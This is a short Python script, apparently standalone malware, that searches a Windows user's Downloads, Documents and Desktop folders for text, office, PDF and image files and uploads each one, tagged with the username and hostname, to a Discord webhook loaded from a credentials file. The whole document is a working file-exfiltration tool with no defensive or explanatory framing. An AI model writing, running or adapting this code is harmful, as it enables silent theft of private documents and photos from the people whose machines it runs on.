import os
import requests
import time
import json
import socket

# Load credentials from the JSON file
with open("credentials.json", "r") as f:
    credentials = json.load(f)

# Access the Discord webhook URL
WEBHOOK_URL = credentials["discord_webhook"]["file_webhook_url"]

# Get the username and hostname
username = os.getlogin()
hostname = socket.gethostname()

# Directories to search
target_directories = [
    os.path.expanduser("~\\Downloads"),      # Downloads folder
    os.path.expanduser("~\\Documents"),      # Documents folder
    os.path.expanduser("~\\Desktop")         # Desktop folder
]

# File types to search for
file_types = [".txt", ".docx", ".pdf", ".jpg", ".png", ".pptx", ".xlsx"]

# Search and send files
for directory in target_directories:
    for root, dirs, files in os.walk(directory):
        for file in files:
            if any(file.endswith(ft) for ft in file_types):
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, "rb") as f:
                        # Include username and hostname in the message
                        payload = {
                            "content": f"File sent from **{username}** ({hostname}): {file}"
                        }
                        requests.post(WEBHOOK_URL, files={"file": f}, data=payload)
                    print(f"Sent: {file_path}")
                    time.sleep(0.5)  # Delay to prevent rate limiting
                except Exception as e:
                    print(f"Error sending {file_path}: {e}")